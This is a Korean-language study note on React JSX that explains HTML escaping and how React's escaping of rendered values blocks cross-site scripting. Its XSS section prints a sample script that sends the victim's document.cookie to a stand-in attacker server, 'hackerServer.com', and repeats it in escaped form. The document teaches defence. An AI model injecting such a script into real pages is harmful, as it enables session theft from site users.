<details open="open">
  <summary>목차</summary>
  <ol>
    <li>
      <a href="#리액트-주요-개념">리액트 주요 개념</a>
      <ul>
        <li><a href="#jsx">JSX</a></li>
        <ol>
          <li><a href="#escape">Escape</a></li>
          <li><a href="#xss">XSS(Cross Site Scripting)</a></li>
          <li><a href="#리액트의-xss-공격-방지">리액트의 XSS 공격 방지</a></li>
        </ol>
      </ul>
    </li>
  </ol>
</details>

# 리액트 주요 개념

## JSX

- 마크업과 UI 로직을 둘 다 포함하여 개발을 할 수 있다.
- 익숙한 문법으로 협업에 용이하다.
- 컴포넌트별로 분류하여 유지보수를 쉽게 할 수 있다.
- 속성 정의는 따옴표('')를 이용해 문자열 리터럴이나 중괄호로 JS 표현식(문법, 변수 등)을 삽입할 수 있다.
- JSX는 HTML보다는 JS에 가깝기 때문에, 클래스 명명은 camelCase 명명 규칙을 사용한다.
- React DOM은 JSX에 삽입된 모든 값을 렌더링하기 전에 이스케이프한다.
  - 따라서 앱에 명시적으로 작성되지 않은 내용은 주입되지 않는다.
  - 모든 내용을 렌더링 되기 전에 문자열로 변환한다.
  - 이런 특성들로 인해 XSS(Cross Site Scripting) 공격을 방지할 수 있다.

#### Escape

특정 문자를 HTML로 변환하는 행위를 이스케이프(Escape)라고 한다.

```
- &은 &amp;로
- <은 &lt;로
- >은 &gt;로
- "은 &quot;로
- '은 &#39;로
- 띄어쓰기는 &nbsp;로
```

예를 들어 HTML에서 다음과 같은 상황은 렌더링이 되지 않는다.

```html
<div><onlydev</div>
```

HTML은 `<`을 태그의 시작으로 인식하기 때문에 뒷부분이 에러가 나는 것이다.
이런 상황들을 고려해 제대로 된 구문 분석을하기 위해 이스케이프를 한다.
그런데 이스케이프가 어떻게 XSS 공격을 방지할 수 있을까?

#### XSS

크로스 사이트 스크립팅(Cross Site Scripting) 공격은 블로그나 게시판 같은 서비스에서 주로 일어나며 여러 사람들이 보는 글에 스크립트를 주입해서 사용자의 정보(쿠키, 세션)를 탈취하거나 비정상적인 기능을 수행하게 한다.

예를 들어 글을 쓸 때

1. 제목과 글을 입력해서 글쓰기를 클릭하면
2. 웹 서버에선 해당 데이터를 받아서 DB에 저장 해뒀다가
3. 다른 사용자가 해당 서버에 접속을 해서 글을 읽게 되면
4. 그때 써놓은 내용을 볼 수 있게 된다.

이런 과정에서 글 대신 스크립트 언어를 써서 다른 사용자가 해당 글을 읽을 때 스크립트 언어가 실행되어 피해를 입게 만드는 것이 XSS 공격이다.

```HTML
<script>
  let xmlHttp = new XMLHttpRequest();
  const url =
    'http://hackerServer.com?victimCookie=' +
    document.cookie;
  xmlHttp.open('GET', url);
  xmlHttp.send();
</script>
```

해당 스크립트 코드가 실행 되면 피해자의 쿠키값을 해커의 서버 주소인 http://hackerServer.com에 그대로 전부 보내게 되고 SessionID같은 정보를 이용해 악용할 수 있는 것이다.

#### 리액트의 XSS 공격 방지

다시 위의 내용으로 돌아가 React DOM은 다음과 같은 특성이 있다.

> React DOM은 JSX에 삽입된 모든 값을 렌더링하기 전에 이스케이프한다.

그렇다면 위의 스크립트 코드를 이스케이프 해보자.

```HTML
<!-- 이스케이프 후  -->
&lt;script&gt;
  let xmlHttp = new XMLHttpRequest();
  const url =
    &quot;http://hackerServer.com?victimCookie=&quot; +
    document.cookie;
  xmlHttp.open(&quot;GET&quot;, url);
  xmlHttp.send();
&lt;/script&gt;
```

렌더링이 되기전(사용자에게 보이기 전) 이스케이프된 모든 값은 브라우저에선 아래와 같이 입력한 그대로 보이게 되지만 HTML 본연의 태그나 스크립트 기능이 제거가 되기 때문에 XSS(Cross Site Scripting) 공격을 방지할 수 있다.

```HTML
<!-- 이스케이프 후 브라우저에서 보이는 화면-->
<script>
  let xmlHttp = new XMLHttpRequest();
  const url =
    'http://hackerServer.com?victimCookie=' +
    document.cookie;
  xmlHttp.open('GET', url);
  xmlHttp.send();
</script>
```
